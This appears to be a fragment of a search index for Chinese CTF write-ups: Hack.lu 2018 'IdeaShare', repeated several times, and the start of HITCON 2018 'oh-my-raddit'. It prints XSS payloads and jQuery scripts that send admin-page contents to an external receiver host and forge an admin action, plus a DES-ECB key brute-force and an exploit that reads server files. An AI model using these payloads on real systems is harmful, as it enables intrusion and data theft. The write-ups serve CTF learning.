\u56e0\u4e3a\u8fd9\u4e2a\u5730\u65b9\u7684url\u683c\u5f0f\u4e0e\u6211\u4eec\u7684XSS\u5229\u7528\u5730\u5740\u53ea\u5dee\u4e86\u4e00\u4e2araw\u53c2\u6570\uff0c\u6240\u4ee5\u731c\u6d4b\u5b58\u5728HTTP\u53c2\u6570\u6c61\u67d3\uff0c\u5229\u7528burp\u6784\u9020\u8fd9\u6837\u7684\u8bf7\u6c42\u5305( \u76f4\u63a5\u5728\u6d4f\u89c8\u5668\u5730\u5740\u680f\u4e2d\u8f93\u5165%26\u4f1a\u88ab\u8f6c\u4e49\uff0c\u65e0\u6cd5\u751f\u6548 )\uff1a POST /?page=idea&pad=1%26raw HTTP / 1.1 Host : arcade.fluxfingers.net:1818 Connection : close Content-Length : 110 Cache-Control : max-age=0 Origin : https://arcade.fluxfingers.net:1818 Upgrade-Insecure-Requests : 1 Content-Type : application/x-www-form-urlencoded User-Agent : Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.67 Safari/537.36 Accept : text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8 Referer : https://arcade.fluxfingers.net:1818/?page=idea&pad=1 Accept-Encoding : gzip, deflate Accept-Language : zh-CN,zh;q=0.9,en;q=0.8 Cookie : PHPSESSID=l04isu07e7tg4m6gn0hsp95ses; session=b956181dfc30a872a190a76406c63e0dc9ab2c373193554c28174f6596e95aa59f41b5dd idea=%3Clink%2Frel%3Dimport+href%3Dhttps%3A%2F%2Fhttps.zer0b.com%2FBlueLotus_XSSReceiver%2Fmyjs%2Ftester.js%3E \u6ce8\u610f\u8fd9\u91cc\u7684pad\u540d\u5b57\u4e0d\u662f1\uff0c\u800c\u662f 1%26raw ,\u53d1\u73b0\u60f3\u6cd5\u4fdd\u5b58\u6210\u529f\uff0c\u7136\u540e\u7ee7\u7eed\u4f7f\u7528\u4e0b\u9762\u7684\u8bf7\u6c42\u8fdb\u884c\u5206\u4eab\u64cd\u4f5c\uff1a POST /?page=idea&pad=1%26raw HTTP / 1.1 Host : arcade.fluxfingers.net:1818 Connection : close Content-Length : 341 Cache-Control : max-age=0 Origin : https://arcade.fluxfingers.net:1818 Upgrade-Insecure-Requests : 1 Content-Type : application/x-www-form-urlencoded User-Agent : Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.67 Safari/537.36 Accept : text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8 Referer : https://arcade.fluxfingers.net:1818/?page=idea&pad=1%26raw Accept-Encoding : gzip, deflate Accept-Language : zh-CN,zh;q=0.9,en;q=0.8 Cookie : PHPSESSID=l04isu07e7tg4m6gn0hsp95ses; session=b956181dfc30a872a190a76406c63e0dc9ab2c373193554c28174f6596e95aa59f41b5dd share=&g-recaptcha-response=03AMGVjXhpe6wbk65KVTuzy2kfsLDT8duce0LwPj18Mec_vBg_6GvZJaBlETmfIoFRCTS-OpEk4KPm5FzfwEAQsfnSxbv_jj80RKuppequjTau-YmmNiy_Om3tbcuJUGGz3sxjMaF75uGQqVJCWpMKua-jBED5ahDSFab2ZP_Pomi9FxVFBcSxkfgYhiu9xpT7wLLbL43rO1SeExQGRBhBp9Yp5fnBfyLFB4b6KloNQ18QmVKBDXTajuUuZoFKM_gmRZs2bu5138xged-JNAuxdpOv7HLoSLpS7ukB0R_REGv5HlQULAofOQs \u5206\u4eab\u6210\u529f\uff0c\u5728\u5206\u4eab\u5217\u8868\u4e2d\u53d1\u73b0\u5982\u4e0b\u540d\u5b57\u7684IDea \u5e76\u4e14\u5b83\u7684url\u5730\u5740\u662f\u8fd9\u6837\u7684\uff0c&\u7b26\u53f7\u867d\u7136\u88ab\u8f6c\u4e49\u4e86\uff0c\u4f46\u5e76\u4e0d\u5f71\u54cd\u8bbf\u95ee\uff0c\u8fd9\u6837admin\u8bbf\u95ee\u8fd9\u4e2a\u94fe\u63a5\u5c06\u4f1a\u89e6\u53d1XSS < a href = ?page=view&owner=304&pad=1&amp;raw > IDea Number 1 &amp; raw </ a > * ps:\u53c2\u6570\u6c61\u67d3\u8fd9\u4e2a\u5730\u65b9\u4e5f\u505a\u4e86\u76f8\u5e94\u8fc7\u6ee4\uff0c\u6240\u4ee5\u662f\u6ca1\u6709\u529e\u6cd5\u5728\u8fd9\u91cc\u76f4\u63a5\u6784\u9020\u5229\u7528js\u7684 \u83b7\u53d6flag \u00b6 \u5728\u6700\u5f00\u59cb\u7684tester.js\u4e2d\u4f7f\u7528\u4e86XSS\u5e73\u53f0\u7684\u5730\u5740\uff0c\u5206\u4eab\u540e\u53d1\u73b0\u6536\u5230\u4e86\u8bbf\u95ee\u8bf7\u6c42\uff0c\u4f46\u5e76\u6ca1\u6709\u6536\u5230cookie \u67e5\u770bCookie\u53d1\u73b0\u88ab\u8bbe\u7f6e\u4e3a\u4e86httpOnly\uff0cjs\u65e0\u6cd5\u5bf9\u5176\u8fdb\u884c\u8bfb\u5199\uff0c\u6240\u4ee5\u540e\u53f0\u65e0\u6cd5\u6536\u5230cookie \u524d\u53f0\u9875\u9762\u4e2d\u6211\u4eec\u53d1\u73b0\u4e86admin\u9875\u9762\u7684\u5730\u5740\uff0c\u53d1\u73b0\u53ea\u6709\u7ba1\u7406\u5458\u624d\u80fd\u8bbf\u95ee\uff0c\u6240\u4ee5\u4fee\u6539\u5229\u7528\u811a\u672c\uff0c\u56de\u4f20admin\u9875\u9762\u7684\u5185\u5bb9\uff0c\u5229\u7528\u811a\u672c\u5185\u5bb9\u5982\u4e0b\uff1a < script src = \"https://cdn.staticfile.org/jquery/1.10.2/jquery.min.js\" ></ script > < script > var xss_url = 'https://https.zer0b.com/BlueLotus_XSSReceiver/index.php' ; //admin page $ . get ( \"/?page=admin\" , async = false , function ( result ){ $ . post ( xss_url , data = \"admin_content=\" + result , async = false ); }); </ script > \u4e8e\u662f\u5728XSS\u5e73\u53f0\u4e2d\u53ef\u4ee5\u6536\u5230\u5305\u542b\u9875\u9762\u5185\u5bb9\u7684\u8bf7\u6c42\uff0cadmin\u9875\u9762\u4e2d\u6700\u91cd\u8981\u7684\u662f\u4e0b\u9762\u8fd9\u6837\u4e00\u4e2aform\u8868\u5355\uff0c\u7528\u6765\u8bbe\u7f6ewinner\u7684Id < form method = \"POST\" action = \"?page=admin\" > < div class = \"form-group\" > < label for = \"password\" > Winner ID </ label > < input type = \"text\" name = \"userid\" class = \"form-control\" /> </ div > < button type = \"submit\" class = \"btn btn-primary\" > Submit </ button > </ form > \u7136\u540e\u6784\u9020\u65b0\u7684\u5229\u7528\u811a\u672c\u5982\u4e0b\uff0c\u4f20\u5165\u6211\u7684\u7528\u6237id\uff0c\u518d\u6b21\u5206\u4eab\u60f3\u6cd5\uff0c\u5c06\u81ea\u5df1\u8bbe\u7f6e\u4e3awinner < script src = \"https://cdn.staticfile.org/jquery/1.10.2/jquery.min.js\" ></ script > < script > var xss_url = 'https://https.zer0b.com/BlueLotus_XSSReceiver/index.php' ; //admin page $ . post ( \"/?page=admin\" ,{ userid : \"304\" }, async = false ); </ script > \u6700\u540e\u8fd4\u56de\u524d\u53f0\uff0c\u67e5\u770b BEST IDEA COMPETITION \u7684\u7ed3\u679c\uff0c\u5f97\u5230flag","title":"IdeaShare"},{"location":"hacklu2018/web/IdeaShare/writeup/#ideashare","text":"","title":"IDeaShare"},{"location":"hacklu2018/web/IdeaShare/writeup/#_1","text":"A place to share your IDeas with your friends! Try to win the best IDea competition but be wary a strong force prevents any cheating. Good luck you will need it! \u9898\u76ee\u5730\u5740(2018.10.31\u4ecd\u53ef\u6b63\u5e38\u8bbf\u95ee)\uff1a IDeaShare \u8bbf\u95ee\u9898\u76ee\u5730\u5740\u53d1\u73b0\u662f\u4e00\u4e2a\u5206\u4eab\u60f3\u6cd5\u7684\u5e73\u53f0\uff0c\u7528\u6237\u767b\u5f55\u540e\u53ef\u4ee5\u4fdd\u5b58\u81ea\u5df1\u7684\u60f3\u6cd5\uff0c\u5c06\u4fdd\u5b58\u7684\u60f3\u6cd5\u5206\u4eab\u4ee5\u540e\uff0c\u7ba1\u7406\u5458\u4f1a\u8fdb\u884c\u67e5\u770b\uff0c\u5982\u679c\u5206\u4eab\u7684\u60f3\u6cd5\u88ab\u7ba1\u7406\u5458\u8bc4\u4ef7\u4e3a Best Idea ,\u5c31\u4f1a\u8d62\u5f97 BEST IDEA COMPETITION","title":"\u9898\u76ee\u63cf\u8ff0"},{"location":"hacklu2018/web/IdeaShare/writeup/#_2","text":"\u8bbf\u95ee\u9898\u76ee\u65f6\uff0c\u54cd\u5e94\u5934\u4e2d\u5b58\u5728\u8fd9\u6837\u7684\u5b57\u6bb5 X-XSS-Protection: 0 ,\u518d\u52a0\u4e0a\u77e5\u9053\u7ba1\u7406\u5458\u5c06\u4f1a\u8bbf\u95ee\u63d0\u4ea4\u7684\u60f3\u6cd5\uff0c\u6240\u4ee5\u5f88\u5bb9\u6613\u60f3\u5230\u6784\u9020XSS\u3002\u4f46\u9996\u5148\u63d0\u4ea4\u7684\u60f3\u6cd5\u4e2d\u5bf9\u8bb8\u591a\u5173\u952e\u5b57\u8fdb\u884c\u4e86\u8fc7\u6ee4(\u8be1\u5f02\u7684\u8fc7\u6ee4\u89c4\u5219)\uff0c\u5176\u6b21\u76f4\u63a5\u8bbf\u95ee\u5206\u4eab\u7684\u60f3\u6cd5\uff0c\u4e5f\u5e76\u4e0d\u80fd\u770b\u5230\u89e3\u6790\u751f\u6548\u7684\u5185\u5bb9\uff0c\u6d4b\u8bd5\u4e2d\u53d1\u73b0\u7b2c\u4e8c\u4e2a\u95ee\u9898\u53ef\u4ee5\u901a\u8fc7HTTP\u53c2\u6570\u6c61\u67d3\u6765\u8fdb\u884c\u7ed5\u8fc7\u3002","title":"\u89e3\u9898\u601d\u8def"},{"location":"hacklu2018/web/IdeaShare/writeup/#_3","text":"","title":"\u89e3\u9898\u8fc7\u7a0b"},{"location":"hacklu2018/web/IdeaShare/writeup/#xss","text":"\u9996\u5148\u6211\u4eec\u5728\u8bb0\u5f55\u60f3\u6cd5\u7684\u6587\u672c\u6846\u4e2d\u8f93\u5165\u60f3\u6cd5\uff0c\u8fd9\u91cc\u7684\u8fc7\u6ee4\u89c4\u5219\u975e\u5e38\u8be1\u5f02\uff0c\u4f46link\u6807\u7b7e\u6ca1\u6709\u88ab\u8fc7\u6ee4\uff0c\u8f93\u5165\u4e0b\u9762\u7684\u5185\u5bb9\uff0c\u53ef\u4ee5\u6210\u529f\u4fdd\u5b58\uff0c\u6ca1\u6709\u88ab\u62e6\u622a\uff1a < link / rel = import href = https://https.zer0b.com/BlueLotus_XSSReceiver/myjs/tester.js > \u7136\u540e\u6211\u7684\u7528\u6237id\u662f304\uff0c\u6240\u4ee5\u8bbf\u95ee\u4e0b\u9762\u7684url\u5730\u5740\u53ef\u4ee5\u770b\u5230\u5206\u4eab\u7684\u5185\u5bb9\uff0c\u6d4b\u8bd5\u5230tester.js\u4e2d\u7684\u5185\u5bb9\u88ab\u6267\u884c\u4e86 https://arcade.fluxfingers.net:1818/?page=view&raw&owner=304&pad=1 \u4ee5\u4e0a\u662fXSS\u7684\u90e8\u5206\u7684\u5229\u7528\u8fc7\u7a0b\uff0c\u4f46\u5176\u5b9e\u8fd9\u4e2a\u5229\u7528\u8fc7\u7a0b\u662f\u6709\u4e00\u4e9b\u9650\u5236\u7684\uff1a link\u6807\u7b7e\u7684href\u5c5e\u6027\u5fc5\u987b\u5f15\u7528https\u7684\u8d44\u6e90\uff0c\u5f15\u7528http\u5730\u5740\u65f6\u4f1a\u6709\u4e0b\u9762\u8fd9\u6837\u7684\u63d0\u793a\u8bf4\u4e0d\u5b89\u5168\uff0c\u88ab\u963b\u6b62 \u6240\u4ee5\u5229\u7528\u65f6\u6700\u597d\u6709\u81ea\u5df1\u7684\u57df\u540d\uff0c\u5e76\u542f\u7528https,\u8fd9\u91cc\u6211\u4f7f\u7528\u4e86 let's encrypt \u8bbe\u7f6e\u8bc1\u4e66(\u514d\u8d39) \u56e0\u4e3alink\u6807\u7b7e\u5f15\u7528\u4e86\u6211\u4eec\u81ea\u5df1\u7f16\u5199\u7684js\u6587\u4ef6\uff0c\u6240\u4ee5\u6211\u4eec\u5b58\u653ejs\u7684\u670d\u52a1\u5668\u9700\u8981\u8bbe\u7f6e Access-Control-Allow-Origin \u5934\u624d\u53ef\u4ee5\u4f7f\u8d44\u6e90\u88ab\u6b63\u5e38\u5f15\u7528\uff0c\u5982\u679c\u672a\u8bbe\u7f6e\u7684\u8bdd\u62a5\u9519\u5982\u4e0b\uff0c\u53ef\u4ee5\u770b\u5230\u8de8\u57df\u5f15\u7528\u8d44\u6e90\u88ab\u7981\u6b62\u4e86 \u5bf9nginx\u670d\u52a1\u5668\u6765\u8bf4\uff0cconfig\u6587\u4ef6\u4e2d\u589e\u52a0\u4ee5\u4e0b\u914d\u7f6e\u5c31\u53ef\u4ee5\u542f\u7528\u8de8\u57df\u8d44\u6e90\u5171\u4eab\u4e86 add_header Access-Control-Allow-Origin * ; add_header Access-Control-Allow-Methods 'GET, POST, OPTIONS' ; add_header Access-Control-Allow-Headers 'DNT,X-Mx-ReqToken,Keep-Alive,User-Agent,X-Requested-With,If-Modified-Since,Cache-Control,Content-Type,Authorization' ;","title":"\u6784\u9020XSS"},{"location":"hacklu2018/web/IdeaShare/writeup/#http","text":"\u5206\u4eab\u4ee5\u540e\u7684\u60f3\u6cd5\u4f1a\u51fa\u73b0\u5728\u8fd9\u6837\u7684\u5217\u8868\u4e2d\uff0c\u7ba1\u7406\u5458\u4f1a\u8bbf\u95ee\u8fd9\u4e2a\u5217\u8868\u4e2d\u7684\u5730\u5740\u67e5\u770b\u5e76\u8bc4\u4f30\u6211\u4eec\u7684\u60f3\u6cd5\uff0c\u5217\u8868\u4e2d\u7684url\u5730\u5740\u5982\u4e0b\u6240\u793a\uff1a < a href = ?page=view&owner=304&pad=3 > IDea Number 3 </ a > \u5f88\u660e\u663e\uff0c\u548c\u524d\u9762\u6211\u4eec\u6784\u9020\u7684XSS\u5730\u5740\u683c\u5f0f\u76f8\u5bf9\u6bd4\uff0c\u8fd9\u91cc\u7f3a\u5c11\u4e86\u4e00\u4e2a raw \u53c2\u6570\uff0c\u6240\u4ee5\u7ba1\u7406\u5458\u8fdb\u884c\u8bbf\u95ee\u65f6\uff0c\u770b\u5230\u5e76\u4e0d\u662f\u6211\u4eec\u63d0\u4ea4\u7684raw\u683c\u5f0f\u7684\u5185\u5bb9\uff0c\u63d0\u4ea4\u7684\u5185\u5bb9\u6ca1\u6709\u88ab\u6d4f\u89c8\u5668\u89e3\u6790\uff0c\u65e0\u6cd5\u89e6\u53d1XSS \u56e0\u4e3a\u8fd9\u4e2a\u5730\u65b9\u7684url\u683c\u5f0f\u4e0e\u6211\u4eec\u7684XSS\u5229\u7528\u5730\u5740\u53ea\u5dee\u4e86\u4e00\u4e2araw\u53c2\u6570\uff0c\u6240\u4ee5\u731c\u6d4b\u5b58\u5728HTTP\u53c2\u6570\u6c61\u67d3\uff0c\u5229\u7528burp\u6784\u9020\u8fd9\u6837\u7684\u8bf7\u6c42\u5305( \u76f4\u63a5\u5728\u6d4f\u89c8\u5668\u5730\u5740\u680f\u4e2d\u8f93\u5165%26\u4f1a\u88ab\u8f6c\u4e49\uff0c\u65e0\u6cd5\u751f\u6548 )\uff1a POST /?page=idea&pad=1%26raw HTTP / 1.1 Host : arcade.fluxfingers.net:1818 Connection : close Content-Length : 110 Cache-Control : max-age=0 Origin : https://arcade.fluxfingers.net:1818 Upgrade-Insecure-Requests : 1 Content-Type : application/x-www-form-urlencoded User-Agent : Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.67 Safari/537.36 Accept : text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8 Referer : https://arcade.fluxfingers.net:1818/?page=idea&pad=1 Accept-Encoding : gzip, deflate Accept-Language : zh-CN,zh;q=0.9,en;q=0.8 Cookie : PHPSESSID=l04isu07e7tg4m6gn0hsp95ses; session=b956181dfc30a872a190a76406c63e0dc9ab2c373193554c28174f6596e95aa59f41b5dd idea=%3Clink%2Frel%3Dimport+href%3Dhttps%3A%2F%2Fhttps.zer0b.com%2FBlueLotus_XSSReceiver%2Fmyjs%2Ftester.js%3E \u6ce8\u610f\u8fd9\u91cc\u7684pad\u540d\u5b57\u4e0d\u662f1\uff0c\u800c\u662f 1%26raw ,\u53d1\u73b0\u60f3\u6cd5\u4fdd\u5b58\u6210\u529f\uff0c\u7136\u540e\u7ee7\u7eed\u4f7f\u7528\u4e0b\u9762\u7684\u8bf7\u6c42\u8fdb\u884c\u5206\u4eab\u64cd\u4f5c\uff1a POST /?page=idea&pad=1%26raw HTTP / 1.1 Host : arcade.fluxfingers.net:1818 Connection : close Content-Length : 341 Cache-Control : max-age=0 Origin : https://arcade.fluxfingers.net:1818 Upgrade-Insecure-Requests : 1 Content-Type : application/x-www-form-urlencoded User-Agent : Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.67 Safari/537.36 Accept : text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8 Referer : https://arcade.fluxfingers.net:1818/?page=idea&pad=1%26raw Accept-Encoding : gzip, deflate Accept-Language : zh-CN,zh;q=0.9,en;q=0.8 Cookie : PHPSESSID=l04isu07e7tg4m6gn0hsp95ses; session=b956181dfc30a872a190a76406c63e0dc9ab2c373193554c28174f6596e95aa59f41b5dd share=&g-recaptcha-response=03AMGVjXhpe6wbk65KVTuzy2kfsLDT8duce0LwPj18Mec_vBg_6GvZJaBlETmfIoFRCTS-OpEk4KPm5FzfwEAQsfnSxbv_jj80RKuppequjTau-YmmNiy_Om3tbcuJUGGz3sxjMaF75uGQqVJCWpMKua-jBED5ahDSFab2ZP_Pomi9FxVFBcSxkfgYhiu9xpT7wLLbL43rO1SeExQGRBhBp9Yp5fnBfyLFB4b6KloNQ18QmVKBDXTajuUuZoFKM_gmRZs2bu5138xged-JNAuxdpOv7HLoSLpS7ukB0R_REGv5HlQULAofOQs \u5206\u4eab\u6210\u529f\uff0c\u5728\u5206\u4eab\u5217\u8868\u4e2d\u53d1\u73b0\u5982\u4e0b\u540d\u5b57\u7684IDea \u5e76\u4e14\u5b83\u7684url\u5730\u5740\u662f\u8fd9\u6837\u7684\uff0c&\u7b26\u53f7\u867d\u7136\u88ab\u8f6c\u4e49\u4e86\uff0c\u4f46\u5e76\u4e0d\u5f71\u54cd\u8bbf\u95ee\uff0c\u8fd9\u6837admin\u8bbf\u95ee\u8fd9\u4e2a\u94fe\u63a5\u5c06\u4f1a\u89e6\u53d1XSS < a href = ?page=view&owner=304&pad=1&amp;raw > IDea Number 1 &amp; raw </ a > * ps:\u53c2\u6570\u6c61\u67d3\u8fd9\u4e2a\u5730\u65b9\u4e5f\u505a\u4e86\u76f8\u5e94\u8fc7\u6ee4\uff0c\u6240\u4ee5\u662f\u6ca1\u6709\u529e\u6cd5\u5728\u8fd9\u91cc\u76f4\u63a5\u6784\u9020\u5229\u7528js\u7684","title":"\u5229\u7528HTTP\u53c2\u6570\u6c61\u67d3"},{"location":"hacklu2018/web/IdeaShare/writeup/#flag","text":"\u5728\u6700\u5f00\u59cb\u7684tester.js\u4e2d\u4f7f\u7528\u4e86XSS\u5e73\u53f0\u7684\u5730\u5740\uff0c\u5206\u4eab\u540e\u53d1\u73b0\u6536\u5230\u4e86\u8bbf\u95ee\u8bf7\u6c42\uff0c\u4f46\u5e76\u6ca1\u6709\u6536\u5230cookie \u67e5\u770bCookie\u53d1\u73b0\u88ab\u8bbe\u7f6e\u4e3a\u4e86httpOnly\uff0cjs\u65e0\u6cd5\u5bf9\u5176\u8fdb\u884c\u8bfb\u5199\uff0c\u6240\u4ee5\u540e\u53f0\u65e0\u6cd5\u6536\u5230cookie \u524d\u53f0\u9875\u9762\u4e2d\u6211\u4eec\u53d1\u73b0\u4e86admin\u9875\u9762\u7684\u5730\u5740\uff0c\u53d1\u73b0\u53ea\u6709\u7ba1\u7406\u5458\u624d\u80fd\u8bbf\u95ee\uff0c\u6240\u4ee5\u4fee\u6539\u5229\u7528\u811a\u672c\uff0c\u56de\u4f20admin\u9875\u9762\u7684\u5185\u5bb9\uff0c\u5229\u7528\u811a\u672c\u5185\u5bb9\u5982\u4e0b\uff1a < script src = \"https://cdn.staticfile.org/jquery/1.10.2/jquery.min.js\" ></ script > < script > var xss_url = 'https://https.zer0b.com/BlueLotus_XSSReceiver/index.php' ; //admin page $ . get ( \"/?page=admin\" , async = false , function ( result ){ $ . post ( xss_url , data = \"admin_content=\" + result , async = false ); }); </ script > \u4e8e\u662f\u5728XSS\u5e73\u53f0\u4e2d\u53ef\u4ee5\u6536\u5230\u5305\u542b\u9875\u9762\u5185\u5bb9\u7684\u8bf7\u6c42\uff0cadmin\u9875\u9762\u4e2d\u6700\u91cd\u8981\u7684\u662f\u4e0b\u9762\u8fd9\u6837\u4e00\u4e2aform\u8868\u5355\uff0c\u7528\u6765\u8bbe\u7f6ewinner\u7684Id < form method = \"POST\" action = \"?page=admin\" > < div class = \"form-group\" > < label for = \"password\" > Winner ID </ label > < input type = \"text\" name = \"userid\" class = \"form-control\" /> </ div > < button type = \"submit\" class = \"btn btn-primary\" > Submit </ button > </ form > \u7136\u540e\u6784\u9020\u65b0\u7684\u5229\u7528\u811a\u672c\u5982\u4e0b\uff0c\u4f20\u5165\u6211\u7684\u7528\u6237id\uff0c\u518d\u6b21\u5206\u4eab\u60f3\u6cd5\uff0c\u5c06\u81ea\u5df1\u8bbe\u7f6e\u4e3awinner < script src = \"https://cdn.staticfile.org/jquery/1.10.2/jquery.min.js\" ></ script > < script > var xss_url = 'https://https.zer0b.com/BlueLotus_XSSReceiver/index.php' ; //admin page $ . post ( \"/?page=admin\" ,{ userid : \"304\" }, async = false ); </ script > \u6700\u540e\u8fd4\u56de\u524d\u53f0\uff0c\u67e5\u770b BEST IDEA COMPETITION \u7684\u7ed3\u679c\uff0c\u5f97\u5230flag","title":"\u83b7\u53d6flag"},{"location":"hitcon2018/web/oh-my-raddit/writeup/","text":"oh-my-raddit1 \u00b6 \u67e5\u770b\u6e90\u4ee3\u7801\u53d1\u73b0: < script type = \"text/javascript\" > function change ( t ){ var limit = t . value if ( limit == 10 ) { location . href = '?s=06e77f2958b65ffd3ca92540eb2d0a42' ; } else if ( limit == 100 ) { location . href = '?s=06e77f2958b65ffd2c0f7629b9e19627' ; } else { location . href = '/' ; } } < /script> \u63a8\u6d4bs\u662f\u7531\u67d0\u79cd\u52a0\u5bc6\u65b9\u5f0f\u5f97\u6765\uff0c\u800c 06e77f2958b65ffd3ca92540eb2d0a42 \u4e0e 06e77f2958b65ffd2c0f7629b9e19627 \u76f8\u6bd4\u8f83\uff0c\u524d\u534a\u90e8\u5206\u5b8c\u5168\u4e00\u81f4\uff0c\u63a8\u6d4b\u52a0\u5bc6\u5206\u7ec4\u4e3a8\u5b57\u8282\u3002 AES\u7b49\u52a0\u5bc6\u65b9\u6cd5\u4e5f\u53ef\u4ee5\u4f7f\u75288\u5b57\u8282\u5206\u7ec4\uff0c\u4f46\u901a\u5e38\u662f16\u5b57\u8282\uff0c\u800cDES\u52a0\u5bc6\u53ea\u80fd\u4f7f\u75288\u5b57\u8282\u5206\u7ec4,\u731c\u6d4b\u4e3aDES\u52a0\u5bc6 \u6ce8\u610f\u5230\u540e\u7f00\u4e3a 3ca92540eb2d0a42 \u7684\u5b9e\u4f8b\u4e00\u5171\u670918\u5904\uff0c\u53ef\u4ee5\u80af\u5b9a\u52a0\u5bc6\u7684\u660e\u6587\u662f8\u7684\u500d\u6570\uff0c\u6240\u4ee5\u672b\u5c3e\u7edf\u4e00\u586b\u5145'\\x08'*8\uff0c\u800c\u4e14\u52a0\u5bc6\u6a21\u5f0f\u4e3aECB\u6a21\u5f0f\uff0cpadding\u89c4\u5219\u6709 pkcs5padding\u3001pkcs7padding\u3001zeropadding\u7b49 \u4f46DES\u901a\u5e38\u4f7f\u7528 pkcs5padding \u4e0d\u7528 zeropadding . \u6240\u4ee5\u73b0\u5728\u53ef\u77e5 \\x08\\x08\\x08\\x08\\x08\\x08\\x08\\x08 \u7684\u52a0\u5bc6\u7ed3\u679c\u4e3a '3ca92540eb2d0a42'.decode('hex') ,\u800c\u4e14\u79d8\u94a5\u5168\u662f\u5c0f\u5199\u5b57\u6bcd\u3002 \u4f7f\u7528hachcat\u8fdb\u884c\u7206\u7834: hashcat -m 14000 3ca92540eb2d0a42:0808080808080808 -a 3 '?l?l?l?l?l?l?l?l' --force \u5f97\u5230\u7ed3\u679c: 3ca92540eb2d0a42:0808080808080808:ldgonaro \u4f46\u79d8\u94a5\u5e76\u4e0d\u662f ldgonaro ,\u662f\u56e0\u4e3aDES\u5b58\u5728\u7b49\u4ef7\u79d8\u94a5: DES\u901a\u8fc7\u79cd\u5b50\u79d8\u94a5\u751f\u6210\u5b50\u79d8\u94a5\u65f6\uff0c\u5c0664\u4f4d\u7684\u79cd\u5b50\u79d8\u94a5\u76848\uff0c16\uff0c24\uff0c32\uff0c40\uff0c48\uff0c56\uff0c64\u4f4d\u4f5c\u4e3a\u5947\u5076\u6821\u9a8c\u4f4d\uff0c\u4e0d\u53c2\u4e0e\u5b50\u79d8\u94a5\u7684\u751f\u6210\u7b97\u6cd5\u3002 \u6240\u4ee5\u79d8\u94a5 bbbbbbbb \u7b49\u4ef7\u4e8e cccccccc \u56e0\u4e3a bin ( ord ( 'b' )) = 0b1100010 bin ( ord ( 'c' )) = 0b1100011 \u4f7f\u7528\u7b49\u4ef7\u79d8\u94a5 ldgonaro \u89e3\u5bc6\u6240\u6709\u5bc6\u6587: from Crypto.Cipher import DES def get_cipher (): import requests import re pattern = re . compile ( '<a href=\"\\?s=(\\w*)\">' ) url = 'http://127.0.0.1:8000/?s=06e77f2958b65ffd2c0f7629b9e19627' r = requests . get ( url ) data = r . text Cipher = pattern . findall ( data ) return Cipher key = 'ldgonaro' DES_fun = DES . new ( key , DES . MODE_ECB ) Cipher = get_cipher () plainData = [] for cipher in Cipher : plaintext = DES_fun . decrypt ( cipher . decode ( 'hex' )) plainData . append ( plaintext ) for plain in plainData : print plain \u5728\u7ed3\u679c\u4e2d\u53d1\u73b0\u4e00\u6761\u4e0e\u4f17\u4e0d\u540c\u7684\u660e\u6587: m=d&f=uploads%2F70c97cc1-079f-4d01-8798-f36925ec \u627e\u5230\u5176\u5bf9\u5e94\u7684\u5bc6\u6587\uff0c\u70b9\u8fd1\u5176\u6240\u5bf9\u5e94\u7684\u94fe\u63a5\u53d1\u73b0\u662f\u4e0b\u8f7d\u529f\u80fd\u3002 \u90a3\u4e48\u6784\u9020payload: m=d&f=app.py \u52a0\u5bc6\u540e\u8bbf\u95ee\u94fe\u63a5\u5f97\u5230app.py\u5185\u5bb9. exp.py: from Crypto.Cipher import DES import requests def get_cipher ( plain ): key = 'ldgonaro' DES_fun = DES . new ( key , DES . MODE_ECB ) length = DES . block_size - len ( plain ) % DES . block_size plain += chr ( length ) * length cipher = DES_fun . encrypt ( plain ) . encode ( 'hex' ) return cipher url = 'http://127.0.0.1:8000/?s=' + get_cipher ( 'm=d&f=app.py' ) r = requests . get ( url ) print r . text \u5f97\u5230app.py: # coding: UTF-8 import os import web import urllib import urlparse from Crypto.Cipher import DES web . config . debug = False ENCRPYTION_KEY = 'megnnaro' urls = ( '/' , 'index' ) app = web . application ( urls , globals ()) db = web . database ( dbn = 'sqlite' , db = 'db.db' ) def encrypt ( s ): length = DES . block_size - ( len ( s ) % DES . block_size ) s = s + chr ( length ) * length cipher = DES . new ( ENCRPYTION_KEY , DES . MODE_ECB ) return cipher . encrypt ( s ) . encode ( 'hex' ) def decrypt ( s ): try : data = s . decode ( 'hex' ) cipher = DES . new ( ENCRPYTION_KEY , DES . MODE_ECB ) data = cipher . decrypt ( data ) data = data [: - ord ( data [ - 1 ])] return dict ( urlparse . parse_qsl ( data )) except Exception as e : print e . message return {} def get_posts ( limit = None ): records = [] for i in db . select ( 'posts' , limit = limit , order = 'ups desc' ): tmp = { 'm' : 'r' , 't' : i . title . encode ( 'utf-8' , 'ignore' ), 'u' : i . id , } tmp [ 'param' ] = encrypt ( urllib . urlencode ( tmp )) tmp [ 'ups' ] = i . ups if i . file : tmp [ 'file' ] = encrypt ( urllib . urlencode ({ 'm' : 'd' , 'f' : i . file })) else : tmp [ 'file' ] = '' records . append ( tmp ) return records def get_urls (): urls = [] for i in [ 10 , 100 , 1000 ]: data = { 'm' : 'p' , 'l' : i } urls . append ( encrypt ( urllib . urlencode ( data )) ) return urls class index : def GET ( self ): s = web . input () . get ( 's' ) if not s : return web . template . frender ( 'templates/index.html' )( get_posts (), get_urls ()) else : s = decrypt ( s ) method = s . get ( 'm' , '' ) if method and method not in list ( 'rdp' ): return 'param error' if method == 'r' : uid = s . get ( 'u' ) record = db . select ( 'posts' , where = 'id=$id' , vars = { 'id' : uid }) . first () if record : raise web . seeother ( record . url ) else : return 'not found' elif method == 'd' : file = s . get ( 'f' ) if not os . path . exists ( file ): return 'not found' name = os . path . basename ( file ) web . header ( 'Content-Disposition' , 'attachment; filename= %s ' % name ) web . header ( 'Content-Type' , 'application/pdf' ) with open ( file , 'rb' ) as fp : data = fp . read () return data elif method == 'p' : limit = s . get ( 'l' ) return web . template . frender ( 'templates/index.html' )( get_posts 